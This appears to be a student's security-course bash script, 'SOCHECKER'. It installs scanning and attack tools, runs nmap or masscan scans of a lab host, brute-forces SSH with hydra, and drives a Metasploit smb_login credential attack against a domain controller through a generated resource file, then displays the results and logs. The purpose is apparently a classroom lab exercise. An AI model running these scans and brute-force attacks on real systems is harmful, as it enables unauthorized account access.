#!/bin/bash
#SoC Project: SOCHECKER ARUN DASSE s13 cfc2407
#Lecturer name: James

echo 'SOC PROJECT: SOCHECKER '
echo 'ARUN DASSE - s13'
echo 'Lecturer: JAMES'

#part1: Installing relevant applications on the local computer
#steps:
#1. Identity what are the tools/applications needed for this project
#2. Tool1: geany - I have installed geany that can be used to open/view my (.sh) file in a separate window so that I can edit the file easily.
#3. Tool2: nmap - Installing this scanning tool to find the open ports on the remote server (ubuntu)
#4. Tool3: massscan - Installing this another scanning option which is used for fast scans of large no of targets
#5. Tool4: ssh - ssh service provides a secure encrypted connection between the victim server (ubuntu) and the local machine, bruteforce to the victim server (ubuntu) using hydra via ssh service
#5. Tool4: msfconsole - Installation, Update, Upgrade and configuring the database (credits: https://www.youtube.com/watch?v=DySaCQE3TlE)
#          install or upgrade our already installed Metasploit Framework in Kali Linux and configure the Metasploit Framework in Kali Linux to execute the msfconsole attack.

figlet SOCHECKER

function insttools()
{
	echo 'Installing all the relevant applications needed for the project'
	echo "Installing geany"
	sudo apt-get install geany
	echo "Installing nmap"
	sudo apt-get install nmap
	echo "Installing Masscan"
	sudo apt-get install masscan
#	echo "Installing fail2ban"
#	sudo apt-get -y install fail2ban
    echo "Installing SSH"
    sudo apt-get install ssh
	echo "Installing hydra"
	sudo apt-get install hydra
#   echo "Installing dsniff"
#   sudo apt-get install dsniff
#	echo "Installing Responder"
#	sudo apt-get install responder
    echo "Installing msfconsole"
	sudo apt-get install metasploit-framework
	sudo service postgresql start
	sudo msfdb init

}

insttools

#Part2: Executing Network scans on the victim server (ubuntu) from the Kali Linux
#steps:
#1. Give the user to choose from two methods of scanning
#2. Option a)nmap scan on the victim server 10.0.0.4 and save the result on the file(name): nmapresult.scan
#3. Option b)masscan on the victim server 10.0.0.4 and save the result on the file(name): masscandresult.scan

function scnnet()
{
	
read -p "Please choose the scanning options: a) Nmap or b) Masscan?" choices

case $choices in

	a)
		echo 'nmap scanning initiating'
		sudo nmap -O -Pn 10.0.0.4 -p- -sV -oG nmapresult.scan
		echo 'nmap scanning done'
	;;
	
	b)
		echo 'masscan initiating'
		sudo masscan 10.0.0.4 -p 20-80 --rate=10000 -oG masscandresult.scan
		echo 'masscan done'
	;;
 esac

}
scnnet


#Part3: Executing attacks on the victim server (ubuntu) and DC from the Kali Linux
#steps:
#1. Give the user to choose from the attack options
#2. Option a)hydra (Bruteforce) to the victim server (ubuntu) with a login and password via ssh and save the output on the file(name): hydraresult.txt
#3. Option b)starting the msfconsole, set rhosts, user list, password list and run the script and save the output on the file(name): msfcresult.txt

function atk()
{
	
	read -p "Please choose the Attack options: a) Hydra or b) Msfconsole?" choices

		case $choices in

			a)
				echo 'Initiating Hydra'
				hydra -l tc -p tc 10.0.0.4  ssh -vV > hydraresult.txt
			;;
	
			b)
				echo 'Initiating Msfconsole'
				echo 'use auxiliary/scanner/smb/smb_login' > smb_enum_scripttest.rc
				echo 'set rhosts 10.0.0.1' >> smb_enum_scripttest.rc
				echo 'set user_file user.lst' >> smb_enum_scripttest.rc
				echo 'set pass_file pass.lst' >> smb_enum_scripttest.rc
				echo 'run' >> smb_enum_scripttest.rc
				echo 'exit' >>  smb_enum_scripttest.rc
					
				msfconsole -r smb_enum_scripttest.rc -o msfcresult.txt
				#exit
			;;
		  
esac

}

atk

#Part4: Give user the option to choose and view the result file of scanning or attack done
#steps:
#1. option a) - Open the file nmapresult.scan to view the nmap scan results after we executed the nmap scanning in part 2.
#2. option b) - Open the file masscandresult.scan to view the masscan results after we executed the masscan in part 2.
#3. option c) - Open the file hydraresult.txt file to view the bruteforce result after executed an attack in part 3.
#4. option d) - Open the file msfcresult.txt file to view the results after executed an attack in part 3. We use the command grep Success to view the particular command line where the success login message displayed.

function scnfiles()
{
	
	read -p "Please choose the result file to view: a) nmap result file or b) Masscan result file or c) Hydra Result File or d) Msfconsole result file?" choices

		case $choices in

			a)
				echo 'Opening the nmap scanning result file'
				cat nmapresult.scan
			;;
								
			b)
				echo 'Opening the masscan result file'
				cat masscandresult.scan
			;;
								
			c) 
				echo 'Opening the Hydra result file'
				cat hydraresult.txt
			;;
								
			d) 
				echo 'Opening the msfconsole result file'
				cat msfcresult.txt | grep Success 
			;;
		
esac	

}
scnfiles


#Part5: Give user the option to choose and view the log file after the attack being executed.
#steps:
#1. option a) - is a log file after bruteforce done on the vitim server (ubuntu), using the command scp (sshcopy) to copy the log file from the victim server to kali linux.
#               open the file and view the logs and grep for the keyword Accepted password
#2. option b) - is a event log file after we excuting the msfconsole and force login to the DC, I saved the event logs a .txt file, copied and save on the kali linux
#               open the file and view the logs 

function lgfiles()
{
	
	read -p "Please choose the result log files to view: a) Hydra log File or b) Msfconsole log file or c) exit?" choices

		case $choices in

			a)
				scp tc@10.0.0.4:~/hydraresult.log ~/socproject
				echo 'Opening the Hydra result file'
				cat hydraresult.log | grep 'Accepted password'
			;;
								
			b) 								    
				echo 'Opening the msfconsole result file'
				cat msfceventlog.txt.csv | tail -50
			;;
								
			c) 
				exit
			;;
esac	
						
}
lgfiles

